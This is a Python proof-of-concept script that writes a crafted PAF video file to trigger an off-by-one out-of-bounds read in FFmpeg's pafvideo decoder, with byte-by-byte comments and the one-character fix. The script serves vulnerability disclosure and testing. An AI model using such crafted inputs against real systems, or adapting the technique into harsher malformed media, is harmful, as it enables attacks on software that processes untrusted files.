#!/usr/bin/env python3
"""
PoC generator for VULN 001: Off-by-one OOB Read in decode_0() in pafvideo.c

File: libavcodec/pafvideo.c, Function: decode_0(), Lines: 234-240
CWE-125: Out-of-bounds Read

The vulnerability is at line 234:
    if (op > opcode_size)
should be:
    if (op >= opcode_size)

When op == opcode_size, the check (op > opcode_size) is FALSE, so execution
continues to opcodes[op] which reads 1 byte PAST the valid opcodes region.

Trigger setup:
- width=8, height=8  -> 2x2 grid of 4x4 blocks -> 4 total blocks
- opcode_size=1      -> 1 byte of opcodes (valid: opcodes[0])
- Block iteration sequence for 8x8 image:
    Block 1: i=0,j=0 -> op=0, check 0>1? No, read opcodes[0]>>4, op stays 0
    Block 2: i=0,j=4 -> op=0, check 0>1? No, read opcodes[0]&15, op++ -> op=1
    Block 3: i=4,j=0 -> op=1, check 1>1? FALSE (bug!), read opcodes[1] (OOB!)
    Block 4: i=4,j=4 -> op=1, check 1>1? FALSE (bug!), read opcodes[1] again (OOB!)
- With the correct check (>=), block 3 would return AVERROR_INVALIDDATA.
  With the buggy check (>), it reads 1 byte past opcodes into the padding buffer.

Note on ASAN detection:
  av_new_packet() allocates pkt->size + AV_INPUT_BUFFER_PADDING_SIZE (64 bytes).
  The OOB byte falls within the 64-byte zero padding, so ASAN does not raise
  a heap-buffer-overflow. The vulnerability is a logical OOB that allows the
  decoder to process frames that should have been rejected.
"""

import struct
import sys

MAGIC = b"Packed Animation File V1.0\n(c) 1992-96 Amazing Studio\x0a\x1a"
# len(MAGIC) = 55 bytes

# PAF container parameters
buffer_size   = 512   # size of one I/O block; header fits in this block (>= 175)
nb_frames     = 1     # number of video frames
frame_ms      = 40    # milliseconds per frame (>= 1)
width         = 8     # video width (must be multiple of 4)
height        = 8     # video height (must be multiple of 4)
max_video_blks = 2    # max video blocks (>= 1); video_size = 2*512 = 1024
max_audio_blks = 2    # max audio blocks (>= 2)
preload_count = 1     # blocks to preload for frame 0
frame_blks    = 1     # total number of block entries in blocks_offset_table

video_size = max_video_blks * buffer_size  # = 1024

# We want pkt->size = 15 (exactly 14 header bytes + 1 opcode byte)
# pkt->size = video_size - frames_offset_table[0]
# So frames_offset_table[0] = video_size - 15 = 1009
packet_size   = 15
frames_offset = video_size - packet_size  # = 1009

# The one video block is at video_frame[block_vf_offset .. block_vf_offset+511]
# We set block_vf_offset=512 so it covers video_frame[512..1023],
# which includes frames_offset=1009 within it.
block_vf_offset = 512  # blocks_offset_table[0] = 512 (no high bit -> video block)

# Tables: each aligned to 512 uint32 entries (FFALIGN(count, 512))
table_entries = 512
table_size    = table_entries * 4   # 2048 bytes

# start_offset = buffer_size + 3 * table_size = 512 + 6144 = 6656
start_offset = buffer_size + 3 * table_size

# ── Header block (buffer_size = 512 bytes) ──────────────────────────────────
header = bytearray(buffer_size)
header[:len(MAGIC)] = MAGIC
# bytes [0..131] = MAGIC + zero padding
# read_header does avio_skip(pb, 132) before reading the fields below
off = 132
struct.pack_into("<I", header, off, nb_frames);    off += 4  # nb_frames
struct.pack_into("<I", header, off, frame_ms);     off += 4  # frame_ms
struct.pack_into("<I", header, off, width);        off += 4  # width
struct.pack_into("<I", header, off, height);       off += 4  # height
struct.pack_into("<I", header, off, 0);            off += 4  # reserved (avio_skip 4)
struct.pack_into("<I", header, off, buffer_size);  off += 4  # buffer_size
struct.pack_into("<I", header, off, preload_count);off += 4  # preload_count
struct.pack_into("<I", header, off, frame_blks);   off += 4  # frame_blks
struct.pack_into("<I", header, off, start_offset); off += 4  # start_offset
struct.pack_into("<I", header, off, max_video_blks);off += 4 # max_video_blks
struct.pack_into("<I", header, off, max_audio_blks);off += 4 # max_audio_blks

# ── Table 1: blocks_count_table[nb_frames] (2048 bytes) ─────────────────────
# blocks_count_table[i] = how many blocks compose frame i+1.
# We only have frame 0 (handled by preload_count), so [0] can be 0.
blocks_count_table = bytearray(table_size)  # all zeros

# ── Table 2: frames_offset_table[nb_frames] (2048 bytes) ────────────────────
# frames_offset_table[0] = 1009: video packet starts at video_frame[1009]
frames_offset_table = bytearray(table_size)
struct.pack_into("<I", frames_offset_table, 0, frames_offset)

# ── Table 3: blocks_offset_table[frame_blks] (2048 bytes) ───────────────────
# blocks_offset_table[0] = 512: load block from file into video_frame[512..1023]
# High bit NOT set -> this is a video block (not audio)
blocks_offset_table = bytearray(table_size)
struct.pack_into("<I", blocks_offset_table, 0, block_vf_offset)

# ── Block data (buffer_size = 512 bytes) ─────────────────────────────────────
# This block is read into video_frame[512..1023].
# The video packet occupies video_frame[1009..1023] = block_data[497..511].
block_data = bytearray(buffer_size)

pkt_off = frames_offset - block_vf_offset  # = 1009 - 512 = 497

# --- Video packet layout (15 bytes starting at block_data[497]) ---
#
# Byte 0: code = 0x20
#   - bit5 set (0x20): keyframe -> c->current_frame=0, reset dirty flags
#   - bits0-3 = 0: triggers decode_0()
#   - bit6 clear (0x40): no palette update (saves bytes)
#
block_data[pkt_off + 0] = 0x20

# Byte 1: i = 0 (skips the complex first section of decode_0)
block_data[pkt_off + 1] = 0x00

# Bytes 2-9: 4 x set_src_position (2 bytes each = big-endian uint16)
# val=0x0000 -> page=0, x=0, y=0 -> src = &frame[0][0], all within bounds
for k in range(8):
    block_data[pkt_off + 2 + k] = 0x00

# Bytes 10-11: opcode_size = 1 (uint16 little-endian)
# Only 1 byte of opcodes follows; valid indices are 0..0.
# The OOB read occurs at opcodes[1] = opcodes[opcode_size].
block_data[pkt_off + 10] = 0x01
block_data[pkt_off + 11] = 0x00

# Bytes 12-13: 2 bytes skipped by decode_0 (bytestream2_skip(gb, 2))
block_data[pkt_off + 12] = 0x00
block_data[pkt_off + 13] = 0x00

# Byte 14: opcodes[0] = 0x00
# High nibble (opcode for block 1, j=0) = 0 -> block_sequences[0] = {0,...} -> no-op
# Low  nibble (opcode for block 2, j=4) = 0 -> same, op increments to 1
# After block 2: op=1 == opcode_size=1. Bug check (1>1)=false. OOB read at opcodes[1].
block_data[pkt_off + 14] = 0x00

# Packet bytes 15+ are pkt->data[15..78] = av_new_packet zero-padding (64 bytes)
# opcodes[1] = pkt->data[15] = first byte of that padding = 0x00
# opcode=0 -> block_sequences[0] does nothing -> loop completes without crash

# ── Assemble the file ─────────────────────────────────────────────────────────
file_data = (
    bytes(header)             +  # offset     0: header (512 bytes)
    bytes(blocks_count_table) +  # offset   512: blocks_count_table (2048 bytes)
    bytes(frames_offset_table)+  # offset  2560: frames_offset_table (2048 bytes)
    bytes(blocks_offset_table)+  # offset  4608: blocks_offset_table (2048 bytes)
    bytes(block_data)            # offset  6656: block data (512 bytes)
)
# Total file size: 7168 bytes

output_file = "vuln_001_input.paf"
with open(output_file, "wb") as f:
    f.write(file_data)

print(f"[+] Generated {output_file}: {len(file_data)} bytes")
print(f"[+] Video packet: {packet_size} bytes at video_frame[{frames_offset}]")
print(f"[+] opcodes base: pkt->data[14], opcode_size=1")
print(f"[+] OOB read: opcodes[1] = pkt->data[15] (in 64-byte AV_INPUT_BUFFER_PADDING_SIZE)")
print(f"[+] With the bug (>):  decode proceeds past opcode_size, reads padding byte")
print(f"[+] With the fix (>=): decode_0 would return AVERROR_INVALIDDATA at block 3")
